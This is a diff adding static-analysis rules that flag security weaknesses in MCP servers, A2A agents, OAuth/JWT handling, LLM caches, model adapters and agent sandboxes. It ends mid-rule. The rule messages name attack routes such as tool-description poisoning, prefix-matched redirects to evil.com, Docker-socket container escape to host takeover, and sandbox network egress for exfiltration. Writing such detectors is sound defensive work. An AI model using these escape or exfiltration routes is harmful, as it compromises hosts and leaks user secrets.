+    - pattern-regex: (?:\bTool|\bFunctionTool|\bStructuredTool|\bBaseTool|@mcp\.tool|@server\.tool|@app\.tool)\s*\([^()]*\bdescription\s*=\s*f["'][^"']*\{
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: \bdescription\s*=\s*(?:None|True|False)\b
+  metadata:
+    category: prompt_injection
+    cwe:
+    - 367
+    - 829
+    original_engine: neuroscan
+    rule_name: MCP tool description built from non-literal content (tool poisoning / rug pull)
+    source_rule: TNT-ML-024
+    residual:
+    - sanitizer
+- id: ns-aiml-126
+  languages:
+  - python
+  severity: ERROR
+  message: 'MCP server run()/serve() call binds host to 0.0.0.0, exposing the MCP
+
+    endpoint on every network interface rather than localhost only.
+
+    Combined with the MCP spec treating auth as optional, this is the
+
+    shape behind CVE-2025-49596 (mcp-inspector RCE): a server reachable
+
+    from the network with no authentication layer visible in the same
+
+    call. Presence signal; confirm this config is production-facing
+
+    before treating as a confirmed vulnerability (sibling check to
+
+    ns-aiml-067''s identical Ray-dashboard convention). This is a
+
+    transport/bind-address finding distinct from ns-aiml-066, which flags
+
+    the same mcp.run(...) call for an unrelated reason (tool-call
+
+    smuggling risk inherent to running the server at all); seeing both on
+
+    one line is expected, not duplicate reporting.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?:mcp|server|app)\.run\([^)]*host\s*=\s*["']0\.0\.0\.0["']
+    - pattern-regex: (?:mcp|server|app)\.run\([^)]*["']0\.0\.0\.0["'][^)]*\)
+    - pattern-regex: FastMCP\([^)]*host\s*=\s*["']0\.0\.0\.0["']
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 668
+    - 200
+    original_engine: neuroscan
+    rule_name: MCP server bound to all interfaces (0.0.0.0)
+    source_rule: ns-aiml-067
+- id: ns-aiml-127
+  languages:
+  - python
+  severity: WARNING
+  message: 'MCP server run() call selects a network transport (transport="sse" or
+
+    "streamable-http"/"streamable_http") with no auth provider/token
+
+    check visible in the same module. The MCP spec makes authentication
+
+    optional and most published servers ship without it; stdio transport
+
+    is process-isolated by the parent that spawns it, but SSE/HTTP
+
+    transports are reachable by anything that can open a TCP connection.
+
+    Presence signal, WARNING (not ERROR) because many MCP servers are
+
+    legitimately local dev tools; confirm this config is
+
+    production-facing before treating as a confirmed vulnerability. This
+
+    is a transport/auth finding distinct from ns-aiml-066, which flags
+
+    the same mcp.run(...) call for an unrelated reason (tool-call
+
+    smuggling risk inherent to running the server at all); seeing both on
+
+    one line is expected, not duplicate reporting.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?:mcp|server|app)\.run\([^)]*transport\s*=\s*["']streamable[-_]http["']
+    - pattern-regex: (?:mcp|server|app)\.run\([^)]*transport\s*=\s*["']sse["']
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)auth.*required
+  - pattern-not-regex: (?i)require.*auth
+  - pattern-not-regex: (?i)auth_provider
+  - pattern-not-regex: (?i)AuthSettings
+  - pattern-not-regex: (?i)BearerAuth
+  - pattern-not-regex: (?i)TokenVerifier
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 306
+    original_engine: neuroscan
+    rule_name: MCP server on SSE/streamable-HTTP transport without visible auth
+    source_rule: ns-aiml-067
+    residual:
+    - sanitizer
+- id: ns-aiml-128
+  languages:
+  - python
+  severity: INFO
+  message: 'A client/host-side handler for sampling/createMessage (or a
+
+    SamplingCallback / sampling_callback / on_sampling_message-style
+
+    handler for MCP sampling requests) appears to return an approval
+
+    result with no visible user-confirmation call in the handler body.
+
+    The MCP spec explicitly requires human-in-the-loop review before a
+
+    sampling request is fulfilled, since the server is asking the client
+
+    to spend the user''s own model budget and trust on content the server
+
+    chose. Heuristic, low-confidence: this rule can only see whether a
+
+    confirmation-shaped call (input/confirm/approve/review) appears
+
+    textually near the handler; a handler that gates approval through an
+
+    indirection this rule cannot see (a separate policy object, a queued
+
+    UI dialog resolved elsewhere) will still be flagged. Treat as an
+
+    INFO-level prompt to manually verify the human-in-the-loop gate
+
+    exists, not a confirmed finding.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)def\s+\w*sampl\w*(?:createmessage|create_message|callback)\w*\s*\(
+    - pattern-regex: (?i)@\w*\.(?:sampling_callback|on_sampling_message)\b
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 862
+    original_engine: neuroscan
+    rule_name: MCP sampling request auto-approved without human gate
+    source_rule: ns-aiml-067
+    residual:
+    - sanitizer
+- id: ns-aiml-129
+  languages:
+  - python
+  severity: WARNING
+  message: 'Inference/serving code constructs a plain jinja2.Environment (or a
+
+    get_jinja_env-style factory) instead of a SandboxedEnvironment. This is
+
+    the structural half of the SGLang CVE-2026-5760 class (also
+
+    CVE-2025-61620 vLLM, CVE-2024-34359 "Llama Drama"): a non-sandboxed Jinja
+
+    env that renders any attacker-publishable model-metadata field
+
+    (chat_template, tokenizer/generation/adapter config) is SSTI -> RCE.
+
+    Presence signal, WARNING: the real dataflow detection is TNT-ML-028
+
+    (rules/ml_taint.yaml), which confirms a model-metadata read actually
+
+    reaches the render. Intended scope is serving/inference files (vllm,
+
+    sglang, transformers, text_generation); the line-by-line regex engine
+
+    cannot require a co-occurring framework import on a separate line (no
+
+    file-level AND in NeuroScanRule.check), so precision comes structurally
+
+    from matching only explicit non-sandboxed Environment CONSTRUCTION, which
+
+    an ordinary Flask/Django app using render_template does not do. A web app
+
+    that hand-builds its own unsandboxed jinja2.Environment is still flagged,
+
+    which is itself the risky shape. Sibling to TNT-ML-028; seeing both is
+
+    expected, not duplicate reporting.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: jinja2\.Environment\s*\(
+    - pattern-regex: =\s*Environment\s*\(\s*(?:\)|\w+\s*=)
+    - pattern-regex: def\s+\w*jinja_env\w*\s*\(
+    - pattern-regex: get_jinja_env\s*\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: SandboxedEnvironment
+  - pattern-not-regex: ImmutableSandboxedEnvironment
+  metadata:
+    category: ssti
+    cwe:
+    - 94
+    - 1336
+    original_engine: neuroscan
+    rule_name: Unsandboxed Jinja2 environment constructed in serving/inference code
+    source_rule: ns-aiml-029
+    residual:
+    - sanitizer
+- id: A2A-BIND-001
+  languages:
+  - python
+  severity: ERROR
+  message: 'An A2A server construction/serve call binds host to 0.0.0.0, exposing
+
+    the agent''s task endpoint on every network interface rather than
+
+    localhost only. Combined with the A2A spec treating authentication as
+
+    optional, this is the same shape behind the early-2026 MCP transport
+
+    CVEs: a peer-reachable agent with no authentication layer visible in the
+
+    same call accepts task delegation from anyone who can open a TCP
+
+    connection. Presence signal; confirm this config is production-facing
+
+    before treating as a confirmed vulnerability (sibling check to
+
+    ns-aiml-126''s identical MCP-server convention). Anchored on the A2A
+
+    server identifiers, so it does not fire on unrelated 0.0.0.0 binds.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: A2AServer\([^)]*host\s*=\s*["']0\.0\.0\.0["']
+    - pattern-regex: A2AServer\([^)]*["']0\.0\.0\.0["'][^)]*\)
+    - pattern-regex: A2AStarletteApplication\([^)]*["']0\.0\.0\.0["']
+    - pattern-regex: A2AFastAPIApplication\([^)]*["']0\.0\.0\.0["']
+    - pattern-regex: (?:a2a_server|a2a_app|a2a)\.(?:run|start|serve)\([^)]*["']0\.0\.0\.0["']
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 668
+    - 200
+    original_engine: neuroscan
+    rule_name: A2A server bound to all interfaces (0.0.0.0)
+    source_rule: ns-aiml-126
+    residual:
+    - sanitizer
+- id: A2A-CARD-001
+  languages:
+  - python
+  severity: WARNING
+  message: 'An AgentCard is constructed with no securitySchemes / security /
+
+    authentication key visible in the surrounding literal. An agent card is
+
+    the public, fetchable description a peer uses to decide how to
+
+    authenticate before delegating a task; a card that advertises skills but
+
+    declares no security scheme is telling every peer the endpoint is open,
+
+    the A2A analogue of an MCP server shipped without auth (ns-aiml-127).
+
+    Presence signal only: this heuristic checks a +/-10 line window around
+
+    the AgentCard(...) construction for a security-scheme key; if the scheme
+
+    is attached elsewhere (a shared builder, a separate registration call)
+
+    this is a false positive. Confirm the card is genuinely unauthenticated
+
+    before treating as a finding.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bAgentCard\s*\(
+    - pattern-regex: \bAgentCard\s*\.\s*model_validate
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 306
+    original_engine: neuroscan
+    rule_name: A2A AgentCard published without a security scheme
+    source_rule: ns-aiml-127
+    residual:
+    - sanitizer
+- id: ns-aiml-159
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: WARNING
+  message: 'A JWT/bearer token is decoded or verified (PyJWT/python-jose''s
+
+    `jwt.decode(...)`, jsonwebtoken''s `jwt.verify(...)`, or jose''s
+
+    `jwtVerify(...)`) with no `audience` check anywhere nearby. RFC 8707
+
+    (Resource Indicators for OAuth 2.0), which the MCP authorization spec
+
+    requires, exists specifically because a token''s SIGNATURE validating
+
+    does not prove it was issued FOR this server -- an authorization
+
+    server that also issues tokens for other resources will happily sign
+
+    a token whose `aud` claim names a different service entirely. A
+
+    server that verifies the signature but not the audience will accept
+
+    any validly-signed token from that authorization server, regardless
+
+    of which resource it was actually issued for -- the confused-deputy
+
+    mechanism behind the class `TNT-ML-025` only catches when the token
+
+    is visibly forwarded in-function; this catches it even when the token
+
+    never leaves the function that decoded it, because the flaw is in
+
+    the decode itself.
+
+    Engine limitation: presence + absence-in-window, like every other
+
+    NeuroScan rule -- an `audience=`/`audience:` check that validates the
+
+    WRONG value (a client ID instead of the resource identifier, or a
+
+    value read from the token itself) still suppresses this finding.
+
+    Triage against what the audience is actually compared to.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bjwt\.decode\(
+    - pattern-regex: \bjwt\.verify\(
+    - pattern-regex: \bjwtVerify\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)\bjwt\.decode\((?:(?!\ndef )[\s\S]){0,400}?(?:audience\s*[:=]|aud["'\]]*\s*[!=]=|verify_aud)
+  - pattern-not-regex: (?i)\bjwt\.verify\((?:(?!\ndef )[\s\S]){0,400}?(?:audience\s*[:=]|aud["'\]]*\s*[!=]=|verify_aud)
+  - pattern-not-regex: (?i)\bjwtVerify\((?:(?!\ndef )[\s\S]){0,400}?(?:audience\s*[:=]|aud["'\]]*\s*[!=]=|verify_aud)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 287
+    - 863
+    original_engine: neuroscan
+    rule_name: JWT/bearer token decoded without audience validation
+    fix: 'Validate the token''s `aud` claim identifies THIS resource server before trusting anything else in it: `jwt.decode(token,
+      key, algorithms=[...], audience=RESOURCE_SERVER_ID)` (PyJWT/python-jose raise on mismatch automatically), `jwt.verify(token,
+      key, { audience: RESOURCE_SERVER_ID })` (jsonwebtoken), or `jwtVerify(token, key, { audience: RESOURCE_SERVER_ID })`
+      (jose). Do not accept a token whose audience is absent, wildcarded, or names a different resource.'
+    residual:
+    - sanitizer
+- id: ns-aiml-160
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: WARNING
+  message: 'Either: a redirect URI is validated with `.startswith()`/`.startsWith()`
+
+    against the registered value instead of an exact string comparison
+
+    (the classic open-redirect bypass -- `https://app.example.com.evil.com`
+
+    or `https://app.example.com/../evil` both satisfy a prefix check that
+
+    exact matching would reject); or: a Dynamic Client Registration (DCR)
+
+    endpoint reads `redirect_uris` directly from the request body with no
+
+    visible allowlist/hostname check nearby before registering the client.
+
+    MCP''s DCR support (RFC 7591) made dynamic redirect-URI registration
+
+    common, which reintroduces classic OAuth open-redirect risk in a
+
+    newly-common code path -- OAuth 2.0 Security BCP requires EXACT
+
+    string comparison for redirect URIs, never prefix or substring
+
+    matching.
+
+    Engine limitation: presence + absence-in-window. A DCR endpoint that
+
+    validates through an indirection this rule cannot see (a schema
+
+    validator, a separate middleware) will still be flagged; conversely,
+
+    an allowlist term appearing anywhere in the same +/-10 line window
+
+    (not necessarily applied to THIS redirect_uris read) suppresses it.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)redirect\w*\.startswith\(
+    - pattern-regex: redirect_uris\s*=\s*request\.(?:json|form|args)
+    - pattern-regex: redirectUris\s*[:=]\s*req\.body
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)redirect_uris\s*=\s*request\.(?:json|form|args)(?:(?!\ndef )[\s\S]){0,400}?(?:allowed[_-]?redirect|redirect.{0,20}not
+      in|not in.{0,20}redirect)
+  - pattern-not-regex: (?i)redirectUris\s*[:=]\s*req\.body(?:(?!\ndef )[\s\S]){0,400}?(?:allowed[_-]?redirect|\.includes\(\s*redirect)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 601
+    - 863
+    original_engine: neuroscan
+    rule_name: OAuth redirect URI validated by prefix, or DCR-registered without an allowlist
+    fix: 'Compare redirect URIs with exact string equality against a fixed allowlist, never a prefix/substring/regex match:
+      `if redirect_uri not in ALLOWED_REDIRECT_URIS: reject()`. For DCR, validate every submitted redirect_uris entry''s full
+      URI (not just its hostname) against policy before registering the client, and reject registration if none are provided.'
+    residual:
+    - sanitizer
+- id: ns-aiml-161
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: WARNING
+  message: 'Either: the `Mcp-Session-Id` header is read and used as the
+
+    apparent basis for identifying/authenticating the caller with no
+
+    other authentication mechanism (Authorization/Bearer header, JWT
+
+    verification) visible nearby; or: a session id is generated from a
+
+    predictable source -- `uuid.uuid1()` (time + MAC address, not
+
+    cryptographically random), a Unix timestamp, or `Date.now()`. The
+
+    MCP authorization spec explicitly states session IDs MUST NOT be
+
+    used for authentication -- they identify a session for routing
+
+    purposes, and unlike a bearer token they are frequently visible in
+
+    logs, browser history, and referrer headers, and (per this second
+
+    signal) are sometimes generated in a way an attacker can guess or
+
+    narrow down.
+
+    Engine limitation: presence + absence-in-window for the first signal
+
+    -- real authentication performed through an indirection this rule
+
+    cannot see (a decorator, a separate middleware file) will still be
+
+    flagged.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)headers(?:\.get\(|\[)\s*["']mcp-session-id["']
+    - pattern-regex: (?i)session_?id\s*=.{0,60}uuid1\(
+    - pattern-regex: (?i)session_?id\s*=.{0,60}int\(time\.time\(\)
+    - pattern-regex: (?i)session_?id\s*=.{0,60}Date\.now\(\)
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)headers(?:\.get\(|\[)\s*["']mcp-session-id["']\s*\)?(?:(?!\ndef )[\s\S]){0,400}?(?:authorization|jwt\.decode\(|jwt\.verify\(|jwtVerify\(|bearer)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 287
+    - 330
+    original_engine: neuroscan
+    rule_name: MCP session id used as authentication, or generated predictably
+    fix: Never treat a session id as proof of identity. Authenticate every request with a real credential (a bearer token
+      validated per ns-aiml-159, or an equivalent), and use the session id only for session routing/correlation after that
+      authentication succeeds. If you generate session ids, use a cryptographically random generator (`uuid.uuid4()`, `secrets.token_urlsafe()`,
+      `crypto.randomUUID()`) -- never a timestamp or a time-based UUID version.
+    residual:
+    - sanitizer
+- id: ns-aiml-162
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: WARNING
+  message: 'One of three RFC 8707 / MCP-authorization-spec anti-patterns: (a) a
+
+    `resource_indicators`/`resourceIndicators` value of `"*"` -- a
+
+    wildcard resource indicator defeats RFC 8707''s entire purpose, which
+
+    is letting an authorization server scope a token to ONE resource
+
+    server; (b) an authorization-server URL taken directly from a
+
+    client-supplied request value (`authorization_server = request.args
+
+    .get(...)`) rather than a fixed, operator-configured value -- this
+
+    lets a client redirect the auth flow at an attacker-controlled
+
+    "authorization server" that then harvests whatever the real client
+
+    would have sent it; (c) an `/authorize`-shaped OAuth endpoint with no
+
+    visible `code_challenge`/PKCE handling -- the MCP spec requires
+
+    PKCE (RFC 7636) for all clients, not only public ones.
+
+    Engine limitation: presence + absence-in-window for (c) -- PKCE
+
+    enforcement through an indirection (a framework-level OAuth library
+
+    that handles it internally) will still be flagged; triage against
+
+    which OAuth library is in use.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)resource_?indicators?\s*=\s*\[?\s*["']\*["']
+    - pattern-regex: (?i)authorization_?server\s*=\s*request\.(?:args|json|form|GET|POST)
+    - pattern-regex: (?i)@app\.route\(\s*["'][^"']*authorize
+    - pattern-regex: (?i)\.(?:get|post)\(\s*["'][^"']*authorize
+    - pattern-regex: (?i)def\s+authorize\s*\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)@app\.route\(\s*["']*[^"']*authorize[^\n]*\n\s*def\s+\w+\s*\([^)]*\)\s*:(?:(?!\ndef )[\s\S]){0,400}?(?:code_?challenge|code_?verifier|\bpkce\b|\bS256\b)
+  - pattern-not-regex: (?i)\.(?:get|post)\(\s*["']*[^"']*authorize(?:(?!\ndef )[\s\S]){0,400}?(?:code_?challenge|code_?verifier|\bpkce\b|\bS256\b)
+  - pattern-not-regex: (?i)def\s+authorize\s*\((?:(?!\ndef )[\s\S]){0,400}?(?:code_?challenge|code_?verifier|\bpkce\b|\bS256\b)
+  metadata:
+    category: mcp_agent
+    cwe:
+    - 346
+    - 863
+    original_engine: neuroscan
+    rule_name: OAuth wildcard resource indicator, client-supplied authorization-server URL, or missing PKCE
+    fix: Never accept a wildcard resource indicator -- require an exact, single resource URI per token request. Take the authorization-server
+      URL from fixed operator configuration, never from a client-supplied request parameter. Require and verify a `code_challenge`/`code_verifier`
+      (PKCE, S256) on every `/authorize` request, public client or not, per the MCP authorization spec.
+    residual:
+    - sanitizer
+- id: ns-aiml-146
+  languages:
+  - python
+  severity: WARNING
+  message: 'An adapter (LoRA/PEFT) is loaded via PeftModel.from_pretrained(),
+
+    load_adapter(), or load_lora_weights() with no visible revision= pin
+
+    and no local_files_only=True nearby. ns-aiml-047 covers base-model
+
+    from_pretrained() only -- adapters are a separate, far more casually
+
+    sourced call family (often pulled from a community hub repo by name
+
+    alone with no vetting the base model itself got), and a single LoRA
+
+    adapter merged into a base model is a fully sufficient backdoor
+
+    vector on its own.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bPeftModel\.from_pretrained\(
+    - pattern-regex: \.load_adapter\(
+    - pattern-regex: \.load_lora_weights\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)\bPeftModel\.from_pretrained\((?:(?!\ndef )[\s\S]){0,300}?(?:revision\s*=|local_files_only\s*=\s*True)
+  - pattern-not-regex: (?i)\.load_adapter\((?:(?!\ndef )[\s\S]){0,300}?(?:revision\s*=|local_files_only\s*=\s*True)
+  - pattern-not-regex: (?i)\.load_lora_weights\((?:(?!\ndef )[\s\S]){0,300}?(?:revision\s*=|local_files_only\s*=\s*True)
+  metadata:
+    category: supply_chain
+    cwe:
+    - 829
+    - 494
+    original_engine: neuroscan
+    rule_name: PEFT/LoRA adapter loaded without a pinned revision or local path
+    residual:
+    - sanitizer
+- id: ns-aiml-147
+  languages:
+  - python
+  severity: WARNING
+  message: 'A model-merge operation (mergekit, a mergekit run_merge()/MergeConfig,
+
+    or PEFT''s add_weighted_adapter()) combines weights with no visible
+
+    provenance check on the inputs. Merging launders provenance: the
+
+    merged artifact carries no signature and no lineage back to its
+
+    component models, so a single compromised remote adapter or model
+
+    folded into a merge silently poisons the result -- and the poisoned
+
+    artifact now looks like a fresh, first-party model.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \.add_weighted_adapter\(
+    - pattern-regex: (?i)\bmergekit\b
+    - pattern-regex: \brun_merge\(
+    - pattern-regex: \bMergeConfiguration\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 494
+    - 829
+    original_engine: neuroscan
+    rule_name: Model merging / weight arithmetic without provenance verification
+- id: ns-aiml-148
+  languages:
+  - python
+  severity: WARNING
+  message: 'An Airflow templated context value (dag_run.conf, params, or an
+
+    ti.xcom_pull() result) is interpolated directly into a bash_command,
+
+    container command, or image string. Same class as our GitHub Actions
+
+    untrusted-context-value rule (ns-cicd-003), applied to the ML
+
+    orchestrator layer: a run parameter an attacker can influence (a
+
+    triggered-DAG payload, an upstream task''s XCom) becomes shell/image
+
+    TEXT rather than data, since Airflow''s Jinja rendering happens before
+
+    the operator ever sees a "parameter" -- it sees a finished string.
+
+    Scoped to Airflow for now; Kubeflow/Dagster/Prefect/DVC orchestrator
+
+    coverage is a follow-up (see the epic tracking).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?i)bash_command\s*=.*\{\{\s*(?:dag_run\.conf|params|ti\.xcom_pull)
+    - pattern-regex: (?i)(?:docker_command|command)\s*=.*\{\{\s*(?:dag_run\.conf|params|ti\.xcom_pull)
+    - pattern-regex: (?i)\bimage\s*=.*\{\{\s*(?:dag_run\.conf|params|ti\.xcom_pull)
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: injection
+    cwe:
+    - 78
+    - 94
+    original_engine: neuroscan
+    rule_name: Airflow DAG run parameter interpolated into a shell/container command
+    residual:
+    - sanitizer
+- id: ns-aiml-149
+  languages:
+  - python
+  severity: WARNING
+  message: 'An artifact is downloaded from an MLOps artifact store (W&B
+
+    run.use_artifact()/Api().artifact(), MLflow download_artifacts(), or
+
+    DVC api.read()/api.open()) with no hash or signature check nearby.
+
+    Same fetch-without-verification shape as ns-aiml-060 (HF Hub
+
+    downloads), applied to artifact-store downloads: the store vouches
+
+    for its own uptime, not the content''s integrity, so a compromised or
+
+    typosquatted artifact name resolves silently.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: (?:wandb\.Api\(\)\.artifact|\.use_artifact)\(
+    - pattern-regex: \bmlflow\.artifacts\.download_artifacts\(
+    - pattern-regex: \bdvc\.api\.(?:read|open)\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: (?i)(?:wandb\.Api\(\)\.artifact|\.use_artifact)\((?:(?!\ndef )[\s\S]){0,300}?(?:hashlib|hmac|checksum|verify_hash|verify_signature|sha256|cosign|sigstore)
+  - pattern-not-regex: (?i)\bmlflow\.artifacts\.download_artifacts\((?:(?!\ndef )[\s\S]){0,300}?(?:hashlib|hmac|checksum|verify_hash|verify_signature|sha256|cosign|sigstore)
+  - pattern-not-regex: (?i)\bdvc\.api\.(?:read|open)\((?:(?!\ndef )[\s\S]){0,300}?(?:hashlib|hmac|checksum|verify_hash|verify_signature|sha256|cosign|sigstore)
+  metadata:
+    category: model_integrity
+    cwe:
+    - 494
+    - 829
+    original_engine: neuroscan
+    rule_name: MLOps artifact-store download without integrity verification
+    residual:
+    - sanitizer
+- id: ns-aiml-152
+  languages:
+  - python
+  severity: WARNING
+  message: 'An LLM semantic/response cache (langchain set_llm_cache(),
+
+    RedisSemanticCache(), GPTCache(), or LiteLLM''s litellm.cache=Cache())
+
+    is configured with no visible namespace/user_id/session_id/tenant
+
+    term nearby. A cache keyed on prompt text alone serves tenant A''s
+
+    completion to tenant B whenever their prompts collide -- with a
+
+    SEMANTIC cache the collision doesn''t even need to be exact,
+
+    similarity above threshold is enough, so the leak happens far more
+
+    often than an exact-match cache would suggest. Same tenant-term
+
+    recognizer as ns-aiml-111 (agent-memory write scoping) -- the
+
+    identical bug, a different call family.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bset_llm_cache\(
+    - pattern-regex: \bRedisSemanticCache\(
+    - pattern-regex: \bGPTCache\(
+    - pattern-regex: \blitellm\.cache\s*=\s*Cache\(
+    - pattern-regex: \bgptcache\.Cache\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: cache_control
+  - pattern-not-regex: \bset_llm_cache\((?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=|session_id\s*=|tenant\w*\s*=)
+  - pattern-not-regex: \bRedisSemanticCache\((?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=|session_id\s*=|tenant\w*\s*=)
+  - pattern-not-regex: \bGPTCache\((?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=|session_id\s*=|tenant\w*\s*=)
+  - pattern-not-regex: \blitellm\.cache\s*=\s*Cache\((?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=|session_id\s*=|tenant\w*\s*=)
+  - pattern-not-regex: \bgptcache\.Cache\((?:(?!\ndef )[\s\S]){0,300}?(?i:user_id\s*=|namespace\s*=|session_id\s*=|tenant\w*\s*=)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 284
+    - 349
+    original_engine: neuroscan
+    rule_name: LLM cache configured without a tenant-scoped key
+    residual:
+    - sanitizer
+- id: ns-aiml-153
+  languages:
+  - python
+  severity: INFO
+  message: 'A semantic cache (RedisSemanticCache()/GPTCache()) is configured
+
+    with no visible similarity_threshold/distance_threshold/
+
+    score_threshold argument nearby. Presence signal, not a claim that
+
+    any particular threshold value is wrong -- the right number is a
+
+    judgment call for the application (how similar is "the same
+
+    question"), but an unset threshold means the library''s own default
+
+    is in effect, which may be far looser than the application actually
+
+    wants; verify it is deliberate. If a threshold IS set, this rule
+
+    does not evaluate whether the number itself is appropriate.'
+  patterns:
+  - pattern-either:
+    - pattern-regex: \bRedisSemanticCache\(
+    - pattern-regex: \bGPTCache\(
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  - pattern-not-regex: cache_control
+  - pattern-not-regex: \bRedisSemanticCache\((?:(?!\ndef )[\s\S]){0,300}?(?i:similarity_threshold\s*=|distance_threshold\s*=|score_threshold\s*=)
+  - pattern-not-regex: \bGPTCache\((?:(?!\ndef )[\s\S]){0,300}?(?i:similarity_threshold\s*=|distance_threshold\s*=|score_threshold\s*=)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 284
+    original_engine: neuroscan
+    rule_name: Semantic cache similarity threshold not set
+    residual:
+    - sanitizer
+- id: ns-aiml-163
+  languages:
+  - dockerfile
+  - python
+  - yaml
+  severity: WARNING
+  message: 'A container is run (or defined via docker-compose) with `privileged=True`
+
+    / `privileged: true`, a `/var/run/docker.sock` bind mount, `network_mode`/
+
+    `pid_mode` set to `"host"`, or `SYS_ADMIN` added to its capabilities. Any
+
+    one of these is a documented container-escape primitive on its own --
+
+    mounting the Docker socket into a container an LLM-driven agent can
+
+    reach gives it the ability to launch new, arbitrary containers on the
+
+    HOST engine (full host takeover, not merely "escape this one
+
+    container"), and this exact shape is a common tutorial pattern for
+
+    giving an agent a "code execution sandbox." `pid_mode`/`network_mode:
+
+    host` similarly erase the isolation a container is supposed to provide.
+
+    Issue #189 (epic #183).'
+  patterns:
+  - pattern-either:
+    - pattern-regex: privileged\s*[:=]\s*["']?[Tt]rue
+    - pattern-regex: /var/run/docker\.sock
+    - pattern-regex: network_mode\s*[:=]\s*["']?host["']?
+    - pattern-regex: pid_mode\s*[:=]\s*["']?host["']?
+    - pattern-regex: cap_add.*SYS_ADMIN
+  - pattern-not-regex: (?m)^\s*#
+  - pattern-not-regex: (?m)^\s*//.*
+  - pattern-not-regex: (?:def test_|conftest|unittest)
+  metadata:
+    category: ai_ml
+    cwe:
+    - 269
+    - 250
+    original_engine: neuroscan
+    rule_name: Escape-grade Docker configuration for an agent/interpreter container
+    fix: 'Never run an agent/interpreter container privileged, with the Docker socket mounted, or with host networking/PID
+      namespace. Use a rootless, capability-dropped container (`cap_drop: [ALL]`), a dedicated bridge network, and its own
+      PID namespace. If the agent genuinely needs to launch containers, use a scoped sibling-container API (e.g. a proxy that
+      only permits a fixed allowlist of images/commands), never a raw docker.sock bind.'
+- id: ns-aiml-164
+  languages:
+  - javascript
+  - python
+  - typescript
+  severity: WARNING
+  message: 'An E2B/Modal-style hosted sandbox (`Sandbox(...)` / `Sandbox.create(...)`)
+
+    is constructed with no visible `timeout`/`timeout_ms`, and no visible
+
+    network-restriction parameter (`allow_internet`, `network_access`,
+
+    `internet_access`, `disable_network`, `no_internet`) anywhere nearby.
+
+    Network egress from a code interpreter is the exfiltration path that
+
+    makes an otherwise-contained RCE matter -- sandboxed code execution
+
+    with an open network connection can still exfiltrate secrets, call out
+
+    to an attacker-controlled endpoint, or pull in and run additional
+
+    payloads. An absent timeout compounds this by letting a single
+
+    sandboxed session run indefinitely.
+
+    Engine limitation: the exact network-control parameter name varies by
+
+    provider and SDK version; this checks for the ABSENCE of any
+
+    recognized term nearby, so a provider whose network isolation is
+
+    configured at the template/organization level rather than per-call
+
